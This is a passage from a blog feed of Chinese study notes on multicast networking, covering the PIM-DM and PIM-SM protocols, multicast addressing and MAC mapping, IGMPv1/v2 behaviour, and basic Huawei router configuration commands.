src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907182919335.png" alt="image-20220907182919335"></p><h3 id="断言机制选举规则"><a href="#断言机制选举规则" class="headerlink" title="断言机制选举规则"></a>断言机制选举规则</h3><div>    <font size="4">        <ul>            <li>PIM路由器在接收到邻居路由器发送的相同组播报文后，会向该网段发送断言（Assert）报文，进行Assert选举。Assert报文内会携带到组播源的单播路由前缀，路由优先级与开销。选举规则如下：</li>            <ul>                <li>单播路由协议优先级较高者获胜。</li>                <li>如果优先级相同，则到组播源的开销较小者获胜。</li>                <li>如果以上都相同，则下游接口IP地址最大者获胜。</li>            </ul>        </ul>    </font></div><hr><h2 id="剪枝机制"><a href="#剪枝机制" class="headerlink" title="剪枝机制"></a>剪枝机制</h2><div><font size="4">对于没有组成员连接的组播路由器，组播网络无需再将组播流量继续放往该设备。通过剪枝机制，组播网络可以将此类路径剪枝。具体工作原理如下：</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907183157934.png" alt="image-20220907183157934"></p><hr><h2 id="维护组播分发树"><a href="#维护组播分发树" class="headerlink" title="维护组播分发树"></a>维护组播分发树</h2><div>    <font size="4">        <ul>            <li>组播分发树形成后不会一直存在，也不会一直不变。</li>            <li>在PIM邻居关系稳定，组成员没有变化的情况下，维护组播分发树一般有两种方式：</li>            <ul>                <li>持续发送组播报文，保证组播路由表项能一直存在。</li>                <li>发送状态刷新报文，保证组播路由表项的下行接口状态不发生变化。</li>            </ul>            </ul>    </font></div><hr><h2 id="状态刷新机制"><a href="#状态刷新机制" class="headerlink" title="状态刷新机制"></a>状态刷新机制</h2><div><font size="4">在PIM-DM网络中，为了避免被裁剪的接口因为“剪枝定时器”超时而恢复转发，离组播源最近的第一跳路由器会周期性地触发State Refresh报文在全网内扩散。</font></div><br><div><font size="4">收到State Refresh报文的PIM路由器会刷新剪枝定时器的状态。被裁剪接口的下游叶子路由器如果一直没有组成员加入，该接口将一直处于抑制转发状态。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907183634753.png" alt="image-20220907183634753"></p><hr><h2 id="新成员加组"><a href="#新成员加组" class="headerlink" title="新成员加组"></a>新成员加组</h2><div>    <font size="4">        <ul>            <li>当有新成员加入组播组后，组播网络需要更新组播分发树，才能将组播数据发往组成员。PIM-DM模式在使用“扩散-剪枝”的方式建立组播分发树后，通过状态刷新机制，使下行接口一旦被抑制就无法自动恢复。</li>            <li>因此需要一些机制来更新组播分发树，一般PIM-DM模式更新组播分发树的方法有两种：</li>            <ul>                <li>等待组播路由表超时后，全网重新泛洪。该方法不可控，在现网中无法实现</li>                <li>使用嫁接（Graft）机制，当新成员加组后，主动反向建立组播分发路径。现网中一般使用嫁接机制来实现新成员加组。</li>            </ul>            </ul>    </font></div><hr><h2 id="嫁接机制"><a href="#嫁接机制" class="headerlink" title="嫁接机制"></a>嫁接机制</h2><div><font size="4">PIM-DM通过嫁接机制，使有新组成员加入的网段快速得到组播报文。</font></div><br><div><font size="4">叶子路由器通过IGMP了解到与其相连的用户网段上，组播组G有新的组成员加入。随后叶子路由器会基于本地的组播路由表向上游发送Graft报文，请求上游路由器恢复相应出接口转发，将其添加在（S，G）表项下游接口列表中。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907184128856.png" alt="image-20220907184128856"></p><hr><h1 id="PIM-DM的基本配置命令"><a href="#PIM-DM的基本配置命令" class="headerlink" title="PIM-DM的基本配置命令"></a>PIM-DM的基本配置命令</h1><div><font size="4"><b>使能路由器的组播路由功能</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei] multicast routing-enable</span><br></pre></td></tr></table></figure><div><font size="4"><b>在接口上使能PIM-DM</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei - GigabitEthernet1/0/0] pim dm</span><br></pre></td></tr></table></figure><div><font size="4"><b>查看PIM邻居参数</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;display pim neighbor</span><br></pre></td></tr></table></figure><div><font size="4"><b>查看PIM路由表参数</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;display pim routing-table</span><br></pre></td></tr></table></figure><hr><h1 id="PIM-DM的局限性"><a href="#PIM-DM的局限性" class="headerlink" title="PIM-DM的局限性"></a>PIM-DM的局限性</h1><div>    <font size="4">        <ul>            <li>中大型组播网络中由于网络较大，如果依然使用PIM-DM会遇到组多问题：</li>            <ul>                <li>使用“扩散-剪枝”方式需要全网扩散组播报文，对于网络有一定冲击。</li>                <li>所有组播路由器均需要维护组播路由表，即使该组播路由器无需转发组播数据。</li>                <li>对于组成员较为稀疏的组播网络，使用“扩散-剪枝”形成组播分发树的效率不高。</li>            </ul>            </ul>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907184524415.png" alt="image-20220907184524415"></p><div class="note danger simple"><div>    <font size="4">PIM-DM模型使用“扩散-剪枝”形成组播分发树的原因是：组播网络中大部分组播路由器无法得知组成员的位置。</font></div></div><hr><h1 id="PIM-SM协议"><a href="#PIM-SM协议" class="headerlink" title="PIM-SM协议"></a>PIM-SM协议</h1><h2 id="PIM-SM（ASM）介绍"><a href="#PIM-SM（ASM）介绍" class="headerlink" title="PIM-SM（ASM）介绍"></a>PIM-SM（ASM）介绍</h2><div>    <font size="4">        <ul>            <li>PIM-SM（ASM）模型形成组播分发树的方法是：</li>            <ul>                <li>将组成员的位置事先告知某台组播路由器（Rendezvous Point，RP），形成RPT（RP Tree）。</li>                <li>组播源在发送组播数据时，组播网络先将组播数据发送至RP，然后由RP再将组播数据转发给组成员。</li>                <li>对于部分次优的组播转发路径，PIM-SM（ASM）能自动优化为最优路径（SPT）。</li>            </ul>            </ul>    </font></div><hr><h2 id="PIM-SM（ASM）协议报文"><a href="#PIM-SM（ASM）协议报文" class="headerlink" title="PIM-SM（ASM）协议报文"></a>PIM-SM（ASM）协议报文</h2><div><font size="4">PIM协议报文直接采用IP封装，目的地址224.0.0.13，IP协议号103。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907185254768.png" alt="image-20220907185254768"></p><hr><h2 id="RP介绍"><a href="#RP介绍" class="headerlink" title="RP介绍"></a>RP介绍</h2><div>    <font size="4">        <ul>            <li>汇聚点RP（Rendezvous Point）为网络中一台重要的PIM路由器，用于处理源端DR注册信息及组成员加入请求，网络中的<font color="red"><b>所有PIM路由器都必须知道RP的地址</b></font>，类似于一个供求信息的汇聚中心。</li>            <li>目前可以通过以下方式配置RP：</li>            <ul>                <li><font color="red"><b>静态RP：</b></font>在网络中的所有PIM路由器上配置相同的RP地址，静态指定RP的位置。</li>                <li><font color="red"><b>动态RP：</b></font>通过选举机制在多个C-RP（Candidate-RP，候选RP）之间选举出RP。</li>                    </ul>        </ul></font></div><h3 id="动态选举RP"><a href="#动态选举RP" class="headerlink" title="动态选举RP"></a>动态选举RP</h3><div>    <font size="4">        <ul>            <li>动态选举RP会涉及两类角色C-BSR（Candidate-Bootstrap Router）与C-RP（Candidate-RP）：</li>            <ul>                <li>C-BSR通过竞选能选举出一个唯一的BSR。</li>                <li>BSR的作用是收集C-RP的信息并形成RP-Set信息，BSR通过PIM报文将RP-Set信息扩散给所有PIM路由器。</li>                <li>PIM路由器收到RP-Set消息后，根据RP选举规则选举出合适的RP。</li>            </ul>                </ul>    </font></div><hr><h2 id="首次形成组播分发树-1"><a href="#首次形成组播分发树-1" class="headerlink" title="首次形成组播分发树"></a>首次形成组播分发树</h2><div>    <font size="4">        <ul>            <li>PIM-SM（ASM）模式首次形成组播分发树主要依赖RPT构建机制，组播源注册机制与DR选举机制。</li>            <ul>                <li>RPT构建机制：组播叶子路由器主动建立到RP的组播分发树（RPT）</li>                <li>组播源注册机制：通过该机制形成组播源到RP的组播分发树（SPT）</li>                <li>DR选举机制：DR负责源端或组成员端组播报文的收发，避免重复组播报文，同时成员端DR还负责发送Join加组消息。</li>            </ul>                </ul>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907190019693.png" alt="image-20220907190019693"></p><hr><h2 id="RPT构建"><a href="#RPT构建" class="headerlink" title="RPT构建"></a>RPT构建</h2><div><font size="4">RPT（RP Tree）是一棵以<font color="red"><b>RP为根</font></b>，以存在组成员关系的<font color="red"><b>PIM路由器为叶子的组播分发树。</font></b></font></div><div><font size="4">当网络中出现组成员（形成IGMP表项）时，组成员端DR向RP发送Join报文，在通向RP的路径上逐跳创建<font color="red"><b>（*，G）表项</b></font>，生成一棵以RP为根的RPT。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907190315463.png" alt="image-20220907190315463"></p><hr><h2 id="组播源注册机制-–-形成SPT"><a href="#组播源注册机制-–-形成SPT" class="headerlink" title="组播源注册机制 – 形成SPT"></a>组播源注册机制 – 形成SPT</h2><div><font size="4">PIM-SM（ASM）模型中，源端DR到RP的组播分发树无法使用Join报文创建，因此需要组播源注册机制帮助形成源端DR到RP的组播分发树（SPT）。</font></div><div><font size="4">形成SPT需要基于Register报文与Join报文，具体过程如下：</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907190522052.png" alt="image-20220907190522052"></p><hr><h2 id="DR选举"><a href="#DR选举" class="headerlink" title="DR选举"></a>DR选举</h2><div>    <font size="4">        <ul>            <ul>                <li>在PIM-SM（ASM）中各路由器通过比较Hello消息上携带的优先级和IP地址，为多路访问网络选举指定路由器DR。</li>                <li>接口DR优先级高的路由器将成为该MA网络的DR，在优先级相同的情况下，接口IP地址大的路由器将成为DR。</li>                <li>当DR出现故障后，邻居路由器之间会重新选举DR。</li>            </ul>                </ul>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907190730442.png" alt="image-20220907190730442"></p><hr><h2 id="RPT次优路径问题"><a href="#RPT次优路径问题" class="headerlink" title="RPT次优路径问题"></a>RPT次优路径问题</h2><div>    <font size="4">        <ul>            <li>在PIM-SM网络中，一个组播组只对应一个RP。因此组播数据最初都会发往RP，由RP进行转发，这会导致两个问题：</li>            <ul>                <li>过大的组播流量会对RP形成巨大的负担。</li>                <li>组播转发路径有可能是次优路径。</li>            </ul>             </ul>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907191033135.png" alt="image-20220907191033135"></p><hr><h2 id="SPT切换机制"><a href="#SPT切换机制" class="headerlink" title="SPT切换机制"></a>SPT切换机制</h2><blockquote><div><font size="4">当数据发送至RP后，RP会沿RPT将数据发送给成员端DR。为了解决RPT潜在的次优路径问题</font></div><div><font size="4">成员端DR会基于组播数据包中的源IP，反向建立从成员端DR到源的SPT。</font></div></blockquote><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907191253400.png" alt="image-20220907191253400"></p><hr><h2 id="维护组播分发树-1"><a href="#维护组播分发树-1" class="headerlink" title="维护组播分发树"></a>维护组播分发树</h2><div><font size="4">当组播分发树（SPT或RPT）稳定后，成员端DR会周期性发送Join/Prune报文，用于维护组播分发树。</font></div><div><font size="4">如果组播在一段时间后（默认210s）没有流量则SPT树会消失，成员端DR恢复到RP的RPT树。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907191448779.png" alt="image-20220907191448779"></p><hr><h2 id="PIM-SM-SSM-基本概述"><a href="#PIM-SM-SSM-基本概述" class="headerlink" title="PIM-SM(SSM)基本概述"></a>PIM-SM(SSM)基本概述</h2><div>    <font size="4">        <ul>            <ul>                <li>由于SSM提前定义了组播的源地址，所以PIM-SM（SSM）可以在成员端DR上基于组播源地址直接反向建立SPT。</li>                <li>PIM-SM（SSM）无需维护RP、无需构建RPT、无需注册组播源，可以直接在组播源与组成员之间建立SPT。</li>                <li>在PIM-SM（SSM）模型中，关键机制包括邻居发现、DR竞选、构建SPT。</li>            </ul>                </ul>    </font></div><hr><h2 id="组播分发树形成与维护"><a href="#组播分发树形成与维护" class="headerlink" title="组播分发树形成与维护"></a>组播分发树形成与维护</h2><div>    <font size="4">        <ul>            <ul>                <li>PIM-SM（SSM）模型构建组播分发树的形成主要依赖IGMPv3报文与Join报文。</li>                <li>PIM-SM（SSM）模型形成的组播分发树会一直存在，不会因为没有组播流量而消失。</li>            </ul>                </ul>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907192031682.png" alt="image-20220907192031682"></p><hr><h1 id="PIM模型比较"><a href="#PIM模型比较" class="headerlink" title="PIM模型比较"></a>PIM模型比较</h1><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907192058449.png" alt="image-20220907192058449"></p><hr><h1 id="PIM-SM的基本配置"><a href="#PIM-SM的基本配置" class="headerlink" title="PIM-SM的基本配置"></a>PIM-SM的基本配置</h1><div><font size="4"><b>使能路由器的组播路由功能</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei] multicast routing-enable  </span><br></pre></td></tr></table></figure><div><font size="4"><b>在接口上使能PIM-SM</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei - GigabitEthernet1/0/0] pim sm</span><br></pre></td></tr></table></figure><div><font size="4"><b>配置静态RP</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei -pim] static-rp  rp-address</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><div>    <font size="4">        <ul>            <li>PIM模型有两种：</li>            <ul>                <li>PIM-DM主要使用在网络规模较小，用户集中的组播网络中。</li>                <li>PIM-SM主要使用在网络规模较大，用户较为分散的组播网络中。PIM-SM基于组播模型又可以分为PIM-SM（ASM）于PIM-SM（SSM）模型，PIM-SM（SSM）模型主要为SSM组播服务。</li>            </ul>            <li>PIM-DM使用“扩散-剪枝”的方式形成组播分发树，在形成分发树时使用Assert选举于DR选举机制防止环路产生，在组播转发时使用PRF机制防止环路产生。</li>            <li>PIM-SM（SSM）无需维护RP、无需构建RPT、无需注册组播源，可以直接在组播源与组成员之间建立SPT。</li>            <li>PIM-SM（ASM）将组成员加组信息发送给RP，形成RPT，组播源再发送组播报文时先将组播报文发送至RP，然后由RP再将组播数据发送至组成员，形成SPT+RPT的组播分发树。为了防止RPT次优路径的问题，PIM-SM（ASM）会发起SPT切换的机制，优化组播分发树。</li>              <li>PIM-SM（SSM）主要为SSM组播模型服务，由于SSM组播模型预先知道组播源的地址，因此可以直接反向建立组播分发树。</li>            </ul>    </font></div>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 组播 </tag>
            
            <tag> PIM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组播基础知识+IGMP协议理论</title>
      <link href="/posts/7888fd62/"/>
      <url>/posts/7888fd62/</url>
      
        <content type="html"><![CDATA[<h1 id="组播网络基本架构"><a href="#组播网络基本架构" class="headerlink" title="组播网络基本架构"></a>组播网络基本架构</h1><div><font size="4">    <ul>        <li>组播网络大体可以分为三个部分：</li>        <li>源端网络：将组播源产生的组播数据发送至组播网络。</li>        <li>组播转发网络：形成无环的组播转发路径，该转发路径也被称为组播分发树（Multicast Distribution Tree）。</li>        <li>成员端网络：通过IGMP协议，让组播网络感知组播组成员位置与加入的组播组。</li>    </ul>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907174213536.png" alt="image-20220907174213536"></p><hr><h1 id="组播IP地址分类"><a href="#组播IP地址分类" class="headerlink" title="组播IP地址分类"></a>组播IP地址分类</h1><h2 id="永久组地址"><a href="#永久组地址" class="headerlink" title="永久组地址"></a>永久组地址</h2><div><font size="4">    <p>（用于标识一组特定的网络设备）</p>    <p>永久组的地址保持不变，组成员数量可以是任意的，甚至可以为零。</p>    <p>224.0.0.1——>All Subnet System（所有子网类的系统）</p>    <p>224.0.0.2——>All Subnet Router（所有子网类的路由器）</p>    <p>224.0.0.3——>PIM（协议无关组播）</p>    <p>224.0.0.22——>IGMPv3协议</p>    </font></div><h2 id="临时组地址"><a href="#临时组地址" class="headerlink" title="临时组地址"></a>临时组地址</h2><div><font size="4">为用户组播组临时分配的IP地址，组成员数量一旦为零，即取消。</font></div><div class="table-container"><table><thead><tr><th>D类地址范围</th><th>含义</th></tr></thead><tbody><tr><td>224.0.0.0~224.0.0.255</td><td>为路由协议预留的永久地址</td></tr><tr><td>224.0.1.0~231.255.255.255/<br>233.0.0.0~238.255.255.255</td><td>用户可用的ASM临时组地址，全网范围有效</td></tr><tr><td>232.0.0.0~232.255.255.255</td><td>用户可用的SSM临时组地址，全网范围有效</td></tr><tr><td>239.0.0.0~239.255.255.255</td><td>用户可用的ASM临时组地址，仅在特定的本地管理域内有效，称为本地管理组播地址</td></tr></tbody></table></div><hr><h1 id="组播模型分类"><a href="#组播模型分类" class="headerlink" title="组播模型分类"></a>组播模型分类</h1><h2 id="ASM-模型-Any-Source-Multicast，任意信源组播"><a href="#ASM-模型-Any-Source-Multicast，任意信源组播" class="headerlink" title="ASM 模型:Any-Source Multicast，任意信源组播"></a>ASM 模型:Any-Source Multicast，任意信源组播</h2><div><font size="3">在ASM 模型中，任意一个发送者都可以作为组播源向某组播组地址发送信息。    <p>众多接收者通过加入由该组播组地址标识的组播组以获得发往该组播组的组播信息。</p>    </font></div><div class="tip bell"><div><font size="3">接收者无法预先知道组播源的位置，但可以在任意时间加入或离开该组播组。</font></div><div><font size="3">接收端只能加入某组播组，而无法具体选择组播源</font></div></div><h2 id="SFM模型-Source-Filtered-Multicast，信源过滤组播"><a href="#SFM模型-Source-Filtered-Multicast，信源过滤组播" class="headerlink" title="SFM模型:Source-Filtered Multicast，信源过滤组播"></a>SFM模型:Source-Filtered Multicast，信源过滤组播</h2><div><font size="3">    该模型继承了ASM 模型，从发送者角度来看，两者的组播组成员关系完全相同。    <p>SFM 模型在功能上对ASM 模型进行了扩展。<br>在SFM 模型中，上层软件对收到的组播报文的源地址进行检查，允许或禁止来自某些组播源的报文通</p>    </font></div><div class="tip bell"><div><font size="3">从接收者的角度来看，只有部分组播源是有效的，组播源被经过了筛选。</font></div><div><font size="3">因此，接收者只能收到来自部分组播源的组播数据。</font></div></div><h2 id="SSM-模型-Source-Specific-Multicast，指定信源组播"><a href="#SSM-模型-Source-Specific-Multicast，指定信源组播" class="headerlink" title="SSM 模型:Source-Specific Multicast，指定信源组播"></a>SSM 模型:Source-Specific Multicast，指定信源组播</h2><div><font size="3">    在现实生活中，用户可能只对某些组播源发送的组播信息感兴趣，而不愿接收其它源发送的信息。    <p>该模型为用户提供了一种能够在客户端指定组播源的传输服务。</p>    </font></div><blockquote><p>SSM 模型与ASM 模型的根本区别在于：</p><p>SSM 模型中的接收者已经通过其它手段预先知道了组播源的具体位置。</p><p>SSM 模型使用与ASM/SFM 模型不同的组播地址范围</p></blockquote><div class="tip bell"><p>直接在接收者与其指定的组播源之间建立专用的组播转发路径。接收端指定组播源</p></div><hr><h1 id="组播MAC"><a href="#组播MAC" class="headerlink" title="组播MAC"></a>组播MAC</h1><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220905234145244.png" alt="image-20220905234145244"></p><div><font size="3">组播MAC地址为48位，是组播IP映射生成的    <p>组播IP地址为32位，前4位为1110；后23位映射到组播MAC </p>    </font></div><div><font size="3">IPv4组播MAC地址的高24位为<b>Ox01005e</b>，第25位为0，低23位为IPv4组播地址的低23位</font></div><div><font size="3">例如组播组地址224.0.1.1对应的组播MAC地址为01-00-5e-00-01-01。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906000709655.png" alt="image-20220906000709655"></p><p><strong>组播IP地址1110后5位丢失（2^5=32位）</strong>—&gt;出现32个ip组播地址映射到同一个mac地址上</p><blockquote><p>Tips：</p><p>MAC的第一个八位组的最后一位，如果是1，代表组播MAC，如果是0，代表单播MAC</p><p>32个组播IP对应1个组播MAC</p></blockquote><hr><h1 id="组播协议分层体系"><a href="#组播协议分层体系" class="headerlink" title="组播协议分层体系"></a>组播协议分层体系</h1><blockquote><p><strong>MVPN（组播VPN)</strong></p><p><strong>GRE/TUNNEL（隧道）  MSDP（组播源发现协议/基于TCP的连接）</strong></p><p><strong>PIM-DM      PIM-SM      DVMRP    ……</strong></p><p><strong>IGMP</strong></p><p><strong>主机（组成员）</strong></p></blockquote><p>PIM：协议无关组播（底层可以使用任意的路由）</p><p>PIM-DM（Dense Mode）密集模式</p><p>PIM-SM（Sparse Mode）稀疏模式<br>|———&gt;SSM<br>|———&gt;ASM</p><hr><h1 id="IGMP（互联网组管理协议）"><a href="#IGMP（互联网组管理协议）" class="headerlink" title="IGMP（互联网组管理协议）"></a>IGMP（互联网组管理协议）</h1><div><font size="3">IGMP用来在IP主机和与其直接相邻的组播路由器之间建立、维护组播组成员关系。</font></div><div>    <font size="3">IGMP工作机制：        <ul>            <li>接受者主机向所在的共享网络（也可以是点到点）报告组成员关系。</li>            <li>查询器周期性地向该共享网段发送组成员查询消息。</li>            <li>接受者主机接收到查询消息后进行相应以报告组成员关系。</li>            <li>网段中的组播路由器依据接收到的响应来刷新组成员的存在信息。（最后一跳的组播路由信息 MRIB）</li>        </ul>    </font></div><blockquote><p><strong>IGMPv1</strong></p><p><strong>IGMPv2———&gt;主流</strong> </p><p><strong>IGMPv3</strong></p></blockquote><p><strong>部分组播配置命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">multicast routing-enable（开启组播协议）</span><br><span class="line"></span><br><span class="line">pim dm（开启DM模式）</span><br><span class="line"></span><br><span class="line">igmp enable（开启IGMP）</span><br><span class="line"></span><br><span class="line">igmp version X （修改版本为1~3）</span><br><span class="line"></span><br><span class="line">display igmp group（查看igmp组）</span><br><span class="line"></span><br><span class="line">igmp max-response-time 5（修改最大响应时间）</span><br><span class="line"></span><br><span class="line">display igmp interface  verbose（查询igmp详细信息）</span><br></pre></td></tr></table></figure><blockquote><p>Tips：IGMP每隔60S查询一次</p></blockquote><h2 id="IGMPv1基本概念"><a href="#IGMPv1基本概念" class="headerlink" title="IGMPv1基本概念"></a>IGMPv1基本概念</h2><div>    <font size="3">IGMPv1主要基于查询和响应机制完成组播组管理。</font></div><div>    <font size="3">查询和响应机制由两种报文实现：        <ul>            <li>普遍组查询报文（General Query）：查询器向共享网络上所有主机和路由器发送的查询报文，用于查询哪些组播组存在成员。</li>            <li>成员关系报告报文（Report）：主机向查询器发送的报告报文，用于申请加入某个组播组或者应答查询报文。</li>        </ul>    </font></div><blockquote><p>由于IGMP报文是组播报文，因此一个多路访问网络里只需要一个组播路由器发送查询报文即可，该组播路由器被称为IGMP查询器（Querier）</p></blockquote><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906002646887.png" alt="image-20220906002646887"></p><h2 id="IGMPv1报文格式"><a href="#IGMPv1报文格式" class="headerlink" title="IGMPv1报文格式"></a>IGMPv1报文格式</h2><div><font size="3">IGMPv1普遍组查询报文与成员关系报告报文均为组播报文，目的地址为224.0.0.1。</font></div><div><font size="3">IGMPv1普遍组查询报文与成员关系报告报文格式类似，其中最主要的是Version，Type，Group Address</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906003452961.png" alt="image-20220906003452961"></p><h2 id="IGMPv1组成员加组机制"><a href="#IGMPv1组成员加组机制" class="headerlink" title="IGMPv1组成员加组机制"></a>IGMPv1组成员加组机制</h2><div><font size="3">通过普遍组查询报文与成员关系报告报文，IGMP查询器可以了解到该网段内哪些组播组存在成员。</font></div><div><font size="3">IGMPv1组成员加组基本流程如下：</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906003749915.png" alt="image-20220906003749915"></p><hr><h2 id="IGMPv1查询器选举机制"><a href="#IGMPv1查询器选举机制" class="headerlink" title="IGMPv1查询器选举机制"></a>IGMPv1查询器选举机制</h2><div><font size="3">IGMPv1没有基于IGMP的查询器选举机制，所以需要依赖组播路由协议（PIM）进行IGMP查询器选举。</font></div><div><font size="3">IGMPv1将组播路由协议（PIM）选举出唯一的<font color='red'>组播信息转发者（Assert Winner或DR）作为IGMPv1的查询器</font>，负责该网段的组成员关系查询。</font></div><div><font size="3">查询器和非查询器均能收到成员关系报告（目的地址224.0.0.1），因此均能形成IGMP路由表与IGMP组表项。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906025218362.png" alt="image-20220906025218362"></p><div>    <font size="3">查询器选举规则:        <ul>            <li>PIM的优先级较大的优选</li>            <li>优先级相同，选择IP地址较大的成为查询器</li>            <li>pim hello-option dr-priority   9         调整PIM协议的dr优先级  （IGMPv1的查询器选举依赖PIM协议）</li>        </ul>    </font></div><h2 id="IGMPv1查询与响应"><a href="#IGMPv1查询与响应" class="headerlink" title="IGMPv1查询与响应"></a>IGMPv1查询与响应</h2><div><font size="3">1、IGMP查询器周期性地向共享网段内所有主机以组播方式（目的地址为224.0.0.1）发送成员关系查询消息（组地址为0.0.0.0）。</font></div><div><font size="3">2、网络内所有主机都接收到该查询消息，如果某主机（如PC1、PC2和PC3）对任意组播组G感兴趣，则以组播方式发送“成员关系报告”报文（其中携带组播组G的地址）来宣告自己将加入该组播组，假设PC2首先发送此报告。</font></div><div><font size="3">3、经过查询/响应过程后，IGMP路由器了解到本网络内存在组播组G对应的接收者，生成<b>（*，G）</b>组播项并依此作为组播信息的转发依据。</font></div><div><font size="3"><b>*表示任意组播源，G表示某个组播组。</b></font></div><blockquote><p>IGMPv1规定，当共享网络中有多台路由器时，由组播路由协议选举查询器。不同的组播路由协议有不同的选举机制。</p></blockquote><h2 id="IGMPv1响应抑制机制"><a href="#IGMPv1响应抑制机制" class="headerlink" title="IGMPv1响应抑制机制"></a>IGMPv1响应抑制机制</h2><div><font size="3">主机收到IGMP成员关系查询时，会对它已经加入的每个组播组启动一个<b>倒计数报告计时器</b>。</font></div><div><font size="3">IGMPv1中计时器值固定使用<b>10秒</b>。<b>计时器到时的主机</b>则主动发送成员关系报告，组地址为该组播组地址，目的地址为查询器发出的地址。</font></div><div><font size="3">于是网段内其它主机都会收到该成员关系报告报文，接收到成员关系报告报文的主机抑制成员关系报告的发送，<b>并删除计时器</b>。</font></div><blockquote><div><font size="3">当路由器周期性的发送成员关系查询报文时，每个主机都会<font color='red'>再次</font>启动计时器进行<b>查询/响应/抑制。</b></font></div></blockquote><h2 id="IGMPv1离组机制"><a href="#IGMPv1离组机制" class="headerlink" title="IGMPv1离组机制"></a>IGMPv1离组机制</h2><div><font size="3">主机离开组时是默默离开<b>不发送</b>任何报文</font></div><div><font size="3">路由器依旧周期性的发送成员关系查询报文，<b>周期为60秒</b></font></div><div><font size="3">当路由器发送<b>3次</b>成员关系查询报文都没有收到响应的成员关系报告报文时</font></div><div><font size="3">路由器认为组内已经没有成员，<b>不再</b>向该网段转发组播报文。</font></div><hr><h2 id="IGMPv2基本概念"><a href="#IGMPv2基本概念" class="headerlink" title="IGMPv2基本概念"></a>IGMPv2基本概念</h2><div>    <font size="3">IGMPv2改善了IGMPv1的缺陷：        <ul>            <li>IGMPv2组成员加组机制与IGMPv1基本相同</li>            <li>IGMPv2增加了离开组机制</li>            <li>IGMPv2增加了查询器选举机制</li>            <li>IGMPv2能与IGMPv1兼容。</li>        </ul>    </font></div><h2 id="IGMPv2报文格式"><a href="#IGMPv2报文格式" class="headerlink" title="IGMPv2报文格式"></a>IGMPv2报文格式</h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906183017634.png" alt="image-20220906183017634"></p><div><font size="4"><b>类型：</b></font></div><div>    <font size="3">1：成员关系查询（0×11）：        <ul>            <li>普遍组查询：用于确定哪些组播组是有效的，即该组是否还有成员在使用，常规查询组地址全零。（0.0.0.0）与IGMPv1一致</li>            <li>特定组查询：用于查询**特定的组播组**是否还有组成员。组地址为特定的组播地址。</li>        </ul>    </font></div><div><font size="3">2：成员关系报告（0×16）：为了和IGMPv1兼容——<b>0x12 = IGMPv1成员报告</b></font></div><div><font size="3">3：离开组消息（0×17）：离开组消息，主机发送的离开报告。</font></div><div><font size="3">最大响应时间：以0.1S为单位，默认值为100，即10S。</font></div><h2 id="IGMPv2查询与响应"><a href="#IGMPv2查询与响应" class="headerlink" title="IGMPv2查询与响应"></a>IGMPv2查询与响应</h2><div><font size="3">IGMPv2版本中，在普遍组查询之外增加了<b>特定组的查询</b>，这种查询报文的目的IP地址为某个组播组的IP地址，报文中的组地址字段也为该组播组的IP地址</font></div><div><font 